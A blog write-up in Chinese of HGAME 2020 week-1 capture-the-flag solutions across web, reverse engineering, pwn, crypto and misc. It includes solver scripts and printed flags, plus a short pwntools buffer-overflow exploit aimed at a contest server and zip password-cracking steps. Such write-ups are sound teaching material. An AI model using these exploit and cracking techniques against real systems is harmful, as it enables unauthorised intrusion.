---
title: hgame2020 week1 wp
date: 2020-07-15 10:36:25
tags: hgame
---

# web

## Cosmos的博客

经过一番百度后来到了这个网址
![](https://r3n0.top/wp-content/uploads/2020/04/week1-1.png)
内容是
![](https://r3n0.top/wp-content/uploads/2020/04/week1-2.png)
然后就试了下git clone,就下载了一个文件夹

查看历史版本，回滚
![](https://r3n0.top/wp-content/uploads/2020/04/week1-3.png)
发现文件夹里多了个flag文件
![](https://r3n0.top/wp-content/uploads/2020/04/week1-4.png)
base64解码
![](https://r3n0.top/wp-content/uploads/2020/04/week1-5.png)

## 街头霸王

改header就行

## Code World

打开是个403
![](https://r3n0.top/wp-content/uploads/2020/04/week1-6.png)
看到url上有个new.php
![](https://r3n0.top/wp-content/uploads/2020/04/week1-7.png)
改成index.php试了下发现不行

试着抓了下包，把第一行的GET改成了post
![](https://r3n0.top/wp-content/uploads/2020/04/week1-8.png)

有变化了？？？

要求两个参数相加结果为10
直接1+9不行
试着用下url编码
![](https://r3n0.top/wp-content/uploads/2020/04/week1-9.png)
flag出现了

## 鸡你太美

找准时刻抓包
![](https://r3n0.top/wp-content/uploads/2020/04/week1-10.png)

# re

## maze

先用ida打开，找到main函数
![](https://r3n0.top/wp-content/uploads/2020/04/week1-11.png)
大致看一下，写上注释

>可以看到v5就是控制位置的
>unk_6020c4是起始位置

打开unk_6020c4
![](https://r3n0.top/wp-content/uploads/2020/04/week1-12.png)
是一长串0和1
再看main函数

- v3位w a s d分别对应v5减64 v5减4 v5加64 v5加4

可以推测地图每行是64个数字
左右移动每次是4个地址，可以推测数字位4个一组，每组的第一个数字组成地图

```python
s = '111110011。。。。。'
i = 0
a = []
k = ''
for z in s:
    k += z
    i += 1
    if i == 4:
        i = 0
        a.append(k)
        k = ''

i = 0
for n in a:
    print(n[0],end='')
    i += 1
    if i == 16:
        print()
        i = 0
```

结果为
![](https://r3n0.top/wp-content/uploads/2020/04/week1-13.png)

![](https://r3n0.top/wp-content/uploads/2020/04/week1-14.png)

## bitwise_operation2

位运算
花了很久才大概看懂
一开始用python写的时候没注意到类型的问题，导致怎么也出不了答案

```c
#include <stdio.h>
int main()
{
    char k, l;
    int a1[8], a2[8];
    int arr1[8] = {41, 8, -91, 79, 15, -38, 69, -109};
    int arr2[8] = {108, 105, -42, 54, 99, -77, 35, -96};
    for (int z = 0; z < 8; z++)
    {
        for (char i = -128; i <= 126; i++)
        {
            for (char j = -128; j <= 126; j++)
            {
                k = ((i & 0xe0) >> 5) | 8 * i;
                l = j;
                k = (k & 0x55) ^ ((l & 0xAA) >> 1) | (k & 0xAA);
                l = (2 * (k & 0x55) ^ (l & 0xAA)) | (l & 0x55);
                k = (k & 0x55 ^ ((l & 0xAA) >> 1)) | (k & 0xAA);
                if (k == arr1[z] && l == arr2[7 - z])
                {
                    a1[z] = (unsigned char)i;
                    a2[7 - z] = (unsigned char)j;
                }
            }
        }
    }
    /*
    for (int i = 0; i < 8; i++)
    {
        printf("%d ", a1[i]);
    }
    printf("\n");
    for (int i = 0; i < 8; i++)
        printf("%d ", a2[i]);
    */
    for (int i = 0; i < 8; i++)
    {
        int a = a1[i] /16;
        int b = a1[i] % 16;
        if (a >= 0 && a <= 9)
            printf("%c", a + 48);
        else if (a >= 10 && a <= 15)
            printf("%c", a + 87);
        if (b >= 0 && b <= 9)
            printf("%c", b + 48);
        else if (b >= 10 && b <= 15)
            printf("%c", b+ 87);
        //printf("    ");
    }
    //printf("\n");
    for (int i = 0; i < 8; i++)
    {
        int a = a2[i] /16;
        int b = a2[i] % 16;
        if (a >= 0 && a <= 9)
            printf("%c", a + 48);
        else if (a >= 10 && a <= 15)
            printf("%c", a + 87);
        if (b >= 0 && b <= 9)
            printf("%c", b + 48);
        else if (b >= 10 && b <= 15)
            printf("%c", b+ 87);
        //printf("    ");
    }
}
```

>hgame{0f233e63637982d266cbf41ecb1b0102}

![](https://r3n0.top/wp-content/uploads/2020/04/week1-15.png)

## Advance

用ida打开，发现没有main函数，
![](https://r3n0.top/wp-content/uploads/2020/04/week1-16.png)
![](https://r3n0.top/wp-content/uploads/2020/04/week1-17.png)
这个很像main函数
大致流程就是输入flag，在对flag进行加密，然后再对结果和

>0g371wvVy9qPztz7xQ+PxNuKxQv74B/5n/zwuPfX

这个字符串进行比较

![](https://r3n0.top/wp-content/uploads/2020/04/week1-18.png)
这个就是加密函数了
![](https://r3n0.top/wp-content/uploads/2020/04/week1-19.png)
大致就是3个字符一组加密成4个字符
然就就写了一段程序

```python
a = [26, 6, 29, 33, 27, 22, 21, 59, 24, 35, 16, 53, 25, 19, 25, 33, 23, 54, 36, 53, 23, 51, 20, 48, 23, 54, 21, 33, 30, 39, 37, 31, 13, 37, 25, 22, 20, 53, 5, 61]
m = 0

for l in range(10):
    for i in range(33, 127):
        for j in range(33, 127):
            for k in range(33, 127):
                if (i >> 2 == a[m]) and ((j >> 4)| 0x10 * (i&3))==a[m+1] and (4*(j&0xf)|(k>>6))==a[m+2] and (k & 0x3f)==a[m+3]:
                    print("%c%c%c" % (i, j, k),end='')
    m += 4



```

>hgame{b45e6a_i5_50_eazy_6VVSQ}

# pwn

## Hard_AAAAA

用ida打开
![](https://r3n0.top/wp-content/uploads/2020/04/week1-20.png)
写入s覆盖v5

```python
#-*-coding:utf-8 -*-
from pwn import *

r = remote('47.103.214.163', 20000)

r.recvuntil('0!')
payload = 'a'*0x7B + "0O0o\0O0"
#print(payload)
r.send(payload)
r.interactive()
```

![](https://r3n0.top/wp-content/uploads/2020/04/week1-21.png)

## oneshot

![](https://r3n0.top/wp-content/uploads/2020/04/week1-22.png)
一开始不明白为什么输入v4后程序就自动断开了，仔细一看

关键就是v4
v4本来是指针变量,后面又把v4的值赋成了0，
后面scanf的时候又取了v4的地址，又把v4解指针后的值赋了1

查看内存后发现flag和name的地址正好相差32
于是可以将name最后的\0改掉让它和flag接上


先输入31个字符，第32位就是\0
在最后输入v4的时候输入\0的地址，就把\0改为了1，得到flag
![](https://r3n0.top/wp-content/uploads/2020/04/week1-23.png)

# crypto

## infantRSA

```python
# coding = utf-8
def computeD(fn, e):
    (x, y, r) = extendedGCD(fn, e)
    #y maybe < 0, so convert it
    if y < 0:
        return fn + y
    return y
 
def extendedGCD(a, b):
    #a*xi + b*yi = ri
    if b == 0:
        return (1, 0, a)
    #a*x1 + b*y1 = a
    x1 = 1
    y1 = 0
    #a*x2 + b*y2 = b
    x2 = 0
    y2 = 1
    while b != 0:
        q = a / b
        #ri = r(i-2) % r(i-1)
        r = a % b
        a = b
        b = r
        #xi = x(i-2) - q*x(i-1)
        x = x1 - q*x2
        x1 = x2
        x2 = x
        #yi = y(i-2) - q*y(i-1)
        y = y1 - q*y2
        y1 = y2
        y2 = y
    return(x1, y1, a)
 
p = 681782737450022065655472455411
q = 675274897132088253519831953441
e = 13
 
n = p * q
fn = (p - 1) * (q - 1)
 
d = computeD(fn, e)
print (d)
```

百度来的代码把d解出来

```python
#!/usr/bin/env python3
from secret import flag
assert flag.startswith(b'hgame{') and flag.endswith(b'}')

m = int.from_bytes(flag, byteorder='big')

p = 681782737450022065655472455411
q = 675274897132088253519831953441
e = 13
c = pow(m, e, p*q)

assert c == 275698465082361070145173688411496311542172902608559859019841
```

然后又百度了一下int.from_bytes

```python
flag = 39062110472669388914389428064087335236334831991333245

m = flag.to_bytes(10000, byteorder='big')

print(m)
```

![](https://r3n0.top/wp-content/uploads/2020/04/week1-24.png)

## Affine

数学太差了，只会暴力穷举

```python
a = 'abcdefghijklmnopqrstuvwxyz'
a += a.upper()
a += '0123456789'
flag = ''
A = 9623
B = 7330
cipher = 'A8I5z{xr1A_J7ha_vG_TpH410}'
TABLE = 'zxcvbnmasdfghjklqwertyuiop1234567890QWERTYUIOPASDFGHJKLZXCVBNM'
for i in cipher:
    k = TABLE.find(i)
    if k == -1:
        flag += i
    else:
        for j in a:
            k = TABLE.find(j)
            m = TABLE[(A*k + B)%62]
            if m == i:
                flag += j
print(flag)
```

## Reorder

按顺序把flag拼出来
![](https://r3n0.top/wp-content/uploads/2020/04/week1-25.png)

## Not_one_time

大致思路就是同一条明文经过不同的密钥加密。
而密钥又是在同一个字符集中取
所以密文的每一位上都有很多种flag对应位上的取值
只要取很多组密文，算出对应位上所以可能的字符，再取交集就行了

>hgame{r3us1nG+M3$5age-&'~rEduC3d_K3Y-5P4ce}

# misc

## 欢迎参加HGAME

>Li0tJTIwLi4uLS0lMjAuLS4uJTIwLS4tLiUyMC0tLS0tJTIwLS0lMjAuJTIwLi4tLS4tJTIwLSUyMC0tLSUyMC4uLS0uLSUyMC4uLS0tJTIwLS0tLS0lMjAuLi0tLSUyMC0tLS0tJTIwLi4tLS4tJTIwLi4uLiUyMC0tLiUyMC4tJTIwLS0lMjAuLi4tLQ

 百度了一下，这是base64编码，解密后得到一串摩斯密码


![](https://r3n0.top/wp-content/uploads/2020/04/week1-26.png)
再将摩斯密码解密
![](https://r3n0.top/wp-content/uploads/2020/04/week1-27.png)

## 壁纸

解压之后是一张图片
![Pixiv@純白可憐.jpg](https://r3n0.top/wp-content/uploads/2020/04/week1-28.jpg)
用二进制格式打开
![](https://r3n0.top/wp-content/uploads/2020/04/week1-29.png)
发现里面有flag.txt和这个

好久才知道要去p站找id

- 非圈里人表示找的好苦啊

解压后
![](https://r3n0.top/wp-content/uploads/2020/04/week1-30.png)
是unicode编码
![](https://r3n0.top/wp-content/uploads/2020/04/week1-31.png)

## 签到题ProPlus

下载了一个文件，解压得到两个文件
![](https://r3n0.top/wp-content/uploads/2020/04/week1-32.png)

打开Password.txt

>Rdjxfwxjfimkn z,ts wntzi xtjrwm xsfjt jm ywt rtntwhf f y   h jnsxf qjFjf jnb  rg fiyykwtbsnkm tm  xa jsdwqjfmkjy wlviHtqzqsGsffywjjyynf yssm >xfjypnyihjn.

>JRFVJYFZVRUAGMAI


>  * Three fenses first, Five Caesar next. English sentense first,  zip password next.

三次栅栏密码，一次凯撒密码得到zip密码，解压
![](https://r3n0.top/wp-content/uploads/2020/04/week1-33.png)

百度解码工具
![](https://r3n0.top/wp-content/uploads/2020/04/week1-34.png)

base32解码得到base64，再解码发现是二进制了

```
b = base64.b64decode(a)
#print(b)

f = open('aaa', mode='wb+')
f.write(b)
f.close
```

打开png
![](https://r3n0.top/wp-content/uploads/2020/04/week1-35.png)
扫码得flag

## 每日推荐

下载到一个pcapng文件，经百度后得知这是一个wireshark的文件
![](https://r3n0.top/wp-content/uploads/2020/04/week1-36.png)
又百度又谷歌了很久后学会了导出
![](https://r3n0.top/wp-content/uploads/2020/04/week1-37.png)
整理一下文件，发现有个特别大的文件
![](https://r3n0.top/wp-content/uploads/2020/04/week1-38.png)
010editor打开发现里面似乎有个音频文件
改成.zip格式打开
![](https://r3n0.top/wp-content/uploads/2020/04/week1-39.png)

提示密码为6位数字，直接暴力破解
解压出一个音频文件。
最后居然在这卡住了，听了好久。。。。。
最后才百度出音频隐写的内容
![](https://r3n0.top/wp-content/uploads/2020/04/week1-40.png)

## 克苏鲁

下载一个压缩包，里面是一个txt和一个加密的zip,看到hint

>【hint1】请使用7zip。另外，加密的zip是无法解出密码的。

看到zip里面bacon.txt的crc32和压缩包外的那个是一样的
![](https://r3n0.top/wp-content/uploads/2020/04/week1-41.png)
于是就用明文攻击，成功解压
![](https://r3n0.top/wp-content/uploads/2020/04/week1-42.png)
再打开doc文件
![](https://r3n0.top/wp-content/uploads/2020/04/week1-43.png)
居然还有密码orz

>*Password in capital letters.

解密后打开word,只有文字没有发现flag.
百度一番后，尝试将doc改为xml，找到了flag
![](https://r3n0.top/wp-content/uploads/2020/04/week1-44.png)